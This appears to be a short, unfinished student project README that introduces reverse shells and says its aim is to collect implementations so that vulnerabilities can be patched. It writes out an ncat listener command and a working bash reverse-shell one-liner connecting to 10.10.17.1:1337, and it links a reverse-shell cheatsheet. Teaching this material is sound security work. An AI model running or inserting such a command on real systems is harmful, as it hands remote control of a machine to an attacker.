# Reverse Shell

<img src="https://miro.medium.com/v2/resize:fit:1024/1*CyVqkmA7wLYaippCGRXW5w.jpeg" alt="why reverse shell" width="600"/>


## first you need a listener
listener example
```bash
ncat -l -p 1337
```
This listens to the TCP port 1337 for ip like 10.10.17.1
## Bash is simplest way to connect
bash reverse shell example
```bash
/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1
```
## There are even more that can be implemented
- PHP reverse shell
- Java reverse shell
- perl reverse shell
- python reverse shell
- etc

## There are countless resources
### Cheatsheet for reverse shell
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Real world examples
1. BrokenSesame vulberability in alibaba PostGreSQl databases
    - 


# 390 Project 
The idea behind our project would be to find and aggregate reverse shell implementations. This would allow various vulnerabilities to be patched.
